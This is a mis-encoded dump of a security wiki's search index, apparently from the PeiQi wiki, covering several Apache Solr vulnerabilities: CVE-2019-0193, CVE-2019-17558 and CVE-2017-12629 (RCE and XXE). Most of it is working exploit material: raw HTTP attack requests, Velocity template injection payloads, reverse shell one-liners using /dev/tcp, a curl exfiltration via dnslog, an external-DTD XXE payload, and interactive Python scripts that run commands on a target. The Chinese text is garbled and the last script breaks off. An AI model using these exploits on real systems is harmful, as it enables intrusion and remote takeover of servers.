æ¨¡å¼æ—¶ï¼Œå¯ä»¥æ¥æ”¶æ¥è‡ªè¯·æ±‚çš„â€dataConfigâ€å‚æ•°ï¼Œè¿™ä¸ªå‚æ•°çš„åŠŸèƒ½ä¸data-config.xml ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åœ¨å¼€å¯ Debug æ¨¡å¼æ—¶æ–¹ä¾¿é€šè¿‡æ­¤å‚æ•°è¿›è¡Œè°ƒè¯•ï¼Œå¹¶ä¸” Debug æ¨¡å¼çš„å¼€å¯æ˜¯é€šè¿‡å‚æ•°ä¼ å…¥çš„ã€‚åœ¨ dataConfig å‚æ•°ä¸­å¯ä»¥åŒ…å« script æ¶æ„è„šæœ¬å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-0193 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° ç‚¹å‡»åˆšåˆšåˆ›å»ºçš„testè¿›å…¥è°ƒè¯• å°†ä¸‹é¢çš„POCä»£ç å¡«å…¥ Debug-Mode ä¸­ æ³¨æ„ POC æ‰§è¡Œçš„ä»£ç ä¸­çš„base64å­—ç¬¦ä¸²çš„ä½ç½®è¯·ç½®æ¢æˆè‡ªå·±çš„ipåœ°å€å¹¶base64åŠ å¯†å¡«å…¥ [!NOTE] bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/9999 0>&1 ç›´æ¥å¦‚ä¸Šå†™å…¥åå¼¹æ— ååº”ï¼Œä¸ç¨³å®šï¼Œéœ€è¦base64åŠ å¯†å†™æ‰èƒ½åå¼¹ä¸€ä¸ªshell ç‚¹å‡»EXecuteæ‰§è¡Œä»£ç  æˆåŠŸåå¼¹shell æ¼æ´åˆ©ç”¨POC [!NOTE] POCä¸æ”¯æŒåå¼¹shellï¼Œå¦‚éœ€åå¼¹shellï¼Œè¯·æŒ‰å¦‚ä¸Šæ­¥éª¤åå¼¹shell #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): mode_url = target_url + \"/solr/\" + core_name + \"/admin/mbeans?cat=QUERY&wt=json\" response = requests.request(\"GET\", url=mode_url, timeout=20) mode = dict(dict(list(json.loads(response.text)[\"solr-mbeans\"])[1])['/dataimport'])['class'] if \"org.apache.solr.handler.dataimport.DataImportHandler\" in mode: print(\"\\033[32m[o] ç›®æ ‡Url,Dataimportæ¨¡å—å¼€å¯\\033[0m\") else: print(\"\\033[31m[x] ç›®æ ‡Url,Dataimportæ¨¡å—æœªå¼€å¯\\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vuln_url = target_url + \"/solr/\" + core_name + \"/dataimport\" headers = { 'Host': target_url, 'User-Agent': \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", 'Accept': \"application/json, text/plain, */*\", 'Accept-Language': \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", 'Accept-Encoding': \"zip, deflate\", 'Referer': \"\" + target_url + \"/solr/\", 'Content-type': \"application/x-www-form-urlencoded\", 'X-Requested-With': \"XMLHttpRequest\", 'Content-Length': \"1007\", 'Connection': \"close\" } payload = \"\"\" command=full-import&verbose=false&clean=false&commit=false&debug=true&core=test&name=dataimport&dataConfig= \"\"\" % cmd response = requests.request(\"POST\", url=vuln_url, data=payload, headers=headers, timeout=30) try: get_message = list(json.loads(response.text)[\"documents\"])[0] message = dict(get_message)['title'][0] print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\", message) except: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) else: POC_3(target_url, core_name, cmd) å‚è€ƒæ–‡ç«  apache solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(cve-2019-0193) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 14:18:01 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558.html","title":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558","keywords":"","body":"Apache Solr Velocityæ¨¡æ¿è¿œç¨‹æ‰§è¡Œ CVE-2019-17558 æ¼æ´æè¿° 2019å¹´10æœˆæœ«ï¼ŒGitHubä»£ç ä¸­å®‰å…¨ç ”ç©¶å‘˜S00pYå‘å¸ƒä¸€ä¸ªApache Solr Velocityæ¨¡ç‰ˆæ³¨å…¥è¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„POCï¼Œå‘ç°ç½‘ç»œä¸Šå‡ºç°é’ˆå¯¹Apache SolræœåŠ¡å™¨çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚è¯¥æ¼æ´æ˜¯ç”±äºVelocityæ¨¡æ¿å­˜åœ¨æ³¨å…¥æ‰€è‡´ï¼ˆVelocityæ˜¯ä¸€ä¸ªåŸºäºJavaçš„æ¨¡æ¿å¼•æ“ï¼Œå¯è®©ä½¿ç”¨è€…é€šè¿‡æ¨¡æ¿è¯­è¨€å¼•ç”¨Javaä¸­å®šä¹‰çš„å¯¹è±¡ï¼‰ã€‚æ”»å‡»è€…åœ¨çŸ¥é“SolræœåŠ¡å™¨ä¸ŠCoreåç§°åï¼Œå…ˆæŠŠparams.resource.loader.enabledè®¾ç½®ä¸ºtrueï¼ˆå°±å¯åŠ è½½æŒ‡å®šèµ„æºï¼‰ï¼Œå†è¿›è¡Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr 5.x è‡³ 8.2.0 ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2019-17558 docker-compose build docker-compose up -d # åˆ›å»ºä¸€ä¸ªsolræ ¸å¿ƒtest docker-compose exec solr bash bin/solr create_core -c test -d example/example-DIH/solr/db è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/ æ­£å¸¸å³å¯ æ¼æ´å¤ç° æ‰“å¼€åè·å– Core ä¿¡æ¯ å¾—çŸ¥ test è¿™ä¸ª Core å­˜åœ¨ è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/test/config æ­£å¸¸ è®¿é—®Coreçš„configé…ç½®ä¿¡æ¯æ—¶ï¼Œé€šè¿‡POSTè¯·æ±‚æŠŠparams.resource.loader.enabledè®¾ç½®ä¸º Trueï¼Œå†é€šè¿‡ç²¾å¿ƒæ„é€ çš„getè¯·æ±‚å³å¯RCEï¼Œæ­¤æ—¶ç”¨æˆ·å°±å¯ä»¥åŠ è½½æŒ‡å®šèµ„æºï¼Œæ„é€ ä¸€ä¸ªèƒ½æ‰§è¡Œå‘½ä»¤çš„æ¶æ„è¯·æ±‚ è®¾ç½®params.resource.loader.enabledä¸ºTrue POST /solr/test/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } å‘½ä»¤æ‰§è¡Œ å†ä½¿ç”¨POCé€ æˆå‘½ä»¤æ‰§è¡Œ http://xxx.xxx.xxx.xxx:8983/solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=\"\")+%23set($rt=$x.class.forName(\"java.lang.Runtime\"))+%23set($chr=$x.class.forName('java.lang.Character'))+%23set($str=$x.class.forName(\"java.lang.String\"))+%23set($ex=$rt.getRuntime().exec(\"whoami\"))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end åå¼¹hellï¼Œå› ä¸ºéƒ¨åˆ†å‘½ä»¤ä¼šè¢«è¿‡æ»¤å¯¼è‡´è¿”å› Error 500 ï¼Œæ‰€ä»¥åå¼¹shelléœ€è¦ç”¨å¦å¤–çš„åå¼¹shellæ–¹æ³• POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 POCéœ€è¦Urlencodingè¿›è¡Œç¼–ç æ‰èƒ½ç»•è¿‡ POC ï¼š %2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{IP}%2F{PORT}%200%3E%261 æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr 5.0.0 - 8.3.1 \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 cve-2019-17558.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mCmd >>> whoami(å‘½ä»¤æ‰§è¡Œ) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name): open_params = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } set_api_data = \"\"\" { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } \"\"\" response = requests.request(\"POST\", url=open_params, data=set_api_data, headers=headers, timeout=10) if response.status_code == 200: print(\"\\033[32m[o] POSTè¯·æ±‚æˆåŠŸå°†params.resource.loader.enabledè®¾ç½®ä¸ºTrue \\033[0m\") else: print(\"\\033[31m[x] POSTè¯·æ±‚params.resource.loader.enabledè®¾ç½®ä¸ºTrueå¤±è´¥ \\033[0m\") sys.exit(0) def POC_3(target_url, core_name, cmd): vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers, timeout=10) if \"Error 500\" in response.text: print(\"\\033[31m[x] ä»£ç æ‰§è¡Œå¤±è´¥ï¼Œå“åº”ä¸º Error 500 \\033[0m\") else: print(\"\\033[32m[o] æ¼æ´æˆåŠŸåˆ©ç”¨,å“åº”ä¸º\\n \\033[0m\",response.text) def POC_4(target_url, core_name, IP, POST): # POC : /bin/bash -c $@|bash 0 echo bash -i >& /dev/tcp/xxx.xxx.xxx.xxx:9999 0>&1 cmd = \"%2Fbin%2Fbash%20-c%20%24%40%7Cbash%200%20echo%20bash%20-i%20%3E%26%2Fdev%2Ftcp%2F{}%2F{}%200%3E%261\".format(IP, POST) vnul_url = target_url + \"/solr/\" + core_name + \"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27\" + cmd + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests.request(\"GET\", url=vnul_url, headers=headers) if __name__ == \"__main__\": title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) POC_2(target_url, core_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_4(target_url, core_name, IP, PORT) else: POC_3(target_url, core_name, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-03 20:10:57 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr RCE è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2017-12629.html","title":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr RCE è¿œç¨‹æ‰§è¡Œæ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ï¼ŒäºŒè€…å¯ä»¥è¿æ¥æˆåˆ©ç”¨é“¾ï¼Œç¼–å·å‡ä¸ºCVE-2017-12629ã€‚ å½±å“ç‰ˆæœ¬ [!NOTE] Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629 docker-compose build docker-compose up -d æ¼æ´å¤ç° è¿œç¨‹å‘½ä»¤æ‰§è¡Œ å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores [!NOTE] é€šè¿‡æŸ¥çœ‹ä»£ç ï¼Œèƒ½å¤Ÿè§¦å‘å‘½ä»¤æ‰§è¡Œçš„äº‹ä»¶æœ‰ä¸¤ä¸ªï¼špostCommit å’Œ newSearcher ä½¿ç”¨ postCommit ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…ç”¨äºè½½å…¥ç¼“å­˜ä¸­ [!NOTE] exe : ping æ‰§è¡Œçš„å‘½ä»¤ dir: å‘½ä»¤å­˜åœ¨çš„ç›®å½•ä½ç½® args:å‘½ä»¤å‚æ•° å¦‚ä¸‹è¯·æ±‚åŒ…æ‰§è¡Œçš„æ˜¯ /bin/ping 1.1.1.1 POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"postCommit\", \"name\":\"newlistener-1\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"ping\", \"dir\":\"/bin/\", \"args\":[\"1.1.1.1\"] } } ç¬¬äºŒä¸ªè¯·æ±‚åŒ…ç”¨äºæ›´æ–°ç¼“å­˜å¹¶æ‰§è¡Œå‘½ä»¤ POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 [{\"id\":\"test\"}] [!NOTE] æ³¨æ„ ç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® \"name\":\"newlistener-1\", listererçš„åå­—éœ€è¦æ›¿æ¢ï¼Œä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º newlistener-1 ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º newlistener-2 æ³¨æ„ ç¬¬äºŒä¸ªè¯·æ±‚åŒ…çš„è¿™ä¸ªä½ç½® [{\"id\":\"test\"}]ï¼Œ åŒç¬¬ä¸€ä¸ªè¯·æ±‚åŒ…çš„nameï¼Œæ¯æ‰§è¡Œä¸€æ¬¡å°±éœ€è¦æ›´æ¢ id ,ä¾‹å¦‚ç¬¬ä¸€æ¬¡ ä¸º test ï¼Œç¬¬äºŒæ¬¡åˆ™éœ€è¦æ”¹ä¸º tset-2 æ³¨æ„ Content-Type: application/json éœ€è¦æ·»åŠ  ä¸æ›´æ”¹æ‰§è¡Œå‘ç”ŸæŠ¥é”™ç¤ºä¾‹ è¿›å…¥dockerå®¹å™¨æŸ¥çœ‹å‘ç°å‘½ä»¤å·²ç»æ‰§è¡Œ ä½¿ç”¨ newSearcher ä½¿ç”¨ newSearcherå¯ä»¥ç›´æ¥åŠ è½½å…¥ç¼“å­˜æ‰§è¡Œå‘½ä»¤ è¯·æ±‚åŒ…å¦‚ä¸‹ POST /solr/demo/config HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Connection: close Content-Type: application/json Content-Length: 198 { \"add-listener\" : { \"event\":\"newSearche\", \"name\":\"newlistener-2\", \"class\":\"solr.RunExecutableListener\", \"exe\":\"bash\", \"dir\":\"/bin/\", \"args\":[\"/tmp/vuln\"] } } [!NOTE] æ³¨æ„ç‚¹åŒä¸Šï¼Œä¹Ÿéœ€è¦æ¯æ¬¡æ‰§è¡Œæ›´æ”¹ \"name\":\"newlistener-2\" çš„å‚æ•° æˆåŠŸæ‰§è¡Œäº†åˆ›å»ºæ–‡ä»¶çš„å‘½ä»¤ å…³äº å¦‚æœæƒ³è¦æ‰§è¡Œå…¶ä»–å‘½ä»¤,åˆ™éœ€è¦å‘½ä»¤çš„çš„ä½ç½®ï¼Œä¾‹å¦‚æ‰§è¡Œpingï¼Œåˆ™éœ€è¦è®¾ç½®dirå‚æ•°ä¸º /usr/bin/ping æˆ–è€… /bin/pingï¼Œå¦‚æœéœ€è¦æ£€æµ‹æ¼æ´æ˜¯å¦å­˜åœ¨åˆ™å¯ä»¥ä½¿ç”¨ dnslogæ¥æ£€æµ‹ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd >>> dnslogåœ°å€(æ¼æ´å¤–è¿æ£€æµ‹) \\033[0m') print('+ \\033[36mCmd >>> shell(åå¼¹shell) \\033[0m') print('+------------------------------------------') def POC_1(target_url): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try: response = requests.request(\"GET\", url=core_url, timeout=10) core_name = list(json.loads(response.text)[\"status\"])[0] print(\"\\033[32m[o] æˆåŠŸè·å¾—core_name,Urlä¸ºï¼š\" + target_url + \"/solr/\" + core_name + \"/config\\033[0m\") return core_name except: print(\"\\033[31m[x] ç›®æ ‡Urlæ¼æ´åˆ©ç”¨å¤±è´¥\\033[0m\") sys.exit(0) def POC_2(target_url, core_name, dnslog_url, n): exp_url = target_url + \"/solr/\" + core_name + \"/config\" dnslog_url = \"`whoami`.\" + dnslog_url headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"curl\",\"dir\":\"/usr/bin/\",\"args\":[\"%s\"]}} \"\"\" % (n, dnslog_url) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œï¼Œè¯·æŸ¥çœ‹dnslog \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") def POC_3(target_url, core_name, n, ip, port): exp_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-Type\": \"application/json\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } payload_cmd = \"\"\" {\"add-listener\":{\"event\":\"postCommit\",\"name\":\"newSearche-%s\",\"class\":\"solr.RunExecutableListener\",\"exe\":\"sh\",\"dir\":\"/bin/\",\"args\":[\"-c\",\"bash -i >& /dev/tcp/%s/%s 0>&1\"]}} \"\"\" % (n, ip, port) response = requests.request(\"POST\", url=exp_url, headers=headers, data=payload_cmd, timeout=30) if \"add-listener\" in response.text: print(\"\\033[32m[o] æˆåŠŸæ‰§è¡Œ \\033[0m\") else: print(\"\\033[31m[x] æ¼æ´åˆ©ç”¨å¤±è´¥ \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) core_name = POC_1(target_url) while True: n = random.randint(1, 9999) cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": exit(0) elif cmd == \"shell\": IP = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬IP >>> \\033[0m\")) PORT = str(input(\"\\033[35mè¯·è¾“å…¥ç›‘å¬PORT >>> \\033[0m\")) POC_3(target_url, core_name, n, IP, PORT) elif cmd == \"dnslog\": dnslog_url = str(input('\\033[35mè¯·è¾“å…¥ä½ çš„dnslogåœ°å€ï¼š\\033[0m')) POC_2(target_url, core_name, dnslog_url, n) [!NOTE] å¦‚æœshellæˆ–dnslogæ— ååº”ï¼Œå¯ä»¥é€‰æ‹©æ›´æ”¹ä¸€ä¸‹POCçš„éƒ¨åˆ†å‚æ•°æ‰§è¡Œéœ€è¦çš„ä»£ç  å‚è€ƒæ–‡ç«  Apache Solrè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼ˆCVE-2017-12629ï¼‰ä»åˆ©ç”¨åˆ°å…¥ä¾µæ£€æµ‹ cve-2017-12629 apache solr xxe & rce æ¼æ´åˆ†æ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2020-11-04 21:13:16 "},"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html":{"url":"PeiQi_Wiki/middleware_wiki/Apache/Apache Solr/Apache Solr XXE æ¼æ´ CVE-2017-12629.html","title":"Apache Solr XXE æ¼æ´ CVE-2017-12629","keywords":"","body":"Apache Solr XXE æ¼æ´ CVE-2017-12629 æ¼æ´æè¿° Apache Solr æ˜¯ä¸€ä¸ªå¼€æºçš„æœç´¢æœåŠ¡å™¨ã€‚Solr ä½¿ç”¨ Java è¯­è¨€å¼€å‘ï¼Œä¸»è¦åŸºäº HTTP å’Œ Apache Lucene å®ç°ã€‚åŸç†å¤§è‡´æ˜¯æ–‡æ¡£é€šè¿‡Httpåˆ©ç”¨XMLåŠ åˆ°ä¸€ä¸ªæœç´¢é›†åˆä¸­ã€‚æŸ¥è¯¢è¯¥é›†åˆä¹Ÿæ˜¯é€šè¿‡ httpæ”¶åˆ°ä¸€ä¸ªXML/JSONå“åº”æ¥å®ç°ã€‚æ­¤æ¬¡7.1.0ä¹‹å‰ç‰ˆæœ¬æ€»å…±çˆ†å‡ºä¸¤ä¸ªæ¼æ´ï¼šXMLå®ä½“æ‰©å±•æ¼æ´ï¼ˆXXEï¼‰å’Œè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ï¼ˆRCEï¼‰ã€‚ å½±å“ç‰ˆæœ¬ Apache Solr ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d æ¼æ´å¤ç° Dnslog å…ˆè¯·æ±‚urlåœ°å€è·å– core å†…å®¹ http://xxx.xxx.xxx.xxx:8983/solr/admin/cores è®¿é—® http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v=''}&wt=xml æŸ¥çœ‹dnslogå¾—åˆ°è¯·æ±‚ è¿œç¨‹è¯»å–æ–‡ä»¶ åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šå†™å…¥ä¸€ä¸ªå¯è®¿é—®çš„XMLæ–‡ä»¶ï¼Œå†…å®¹å†™å…¥ \"> ç„¶åè¯·æ±‚è¿™ä¸ªæ–‡ä»¶æ¥è¯»å–æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶ http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] æ³¨æ„è¿™é‡Œçš„payloadè¿›è¡Œäº†urlç¼–ç ,è¯·æ±‚çš„æ–‡ä»¶ä¸º http://peiqi.tech/1.dtdï¼Œæœ‰æ›´å¤šéœ€æ±‚è‡ªè¡Œæ›´æ”¹å†™å…¥çš„xmlæ–‡ä»¶ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mVersion: Apache Solr >> http://xxx.xxx.xxx.xxx:8983 \\033[0m') print('+ \\033[36mcmd 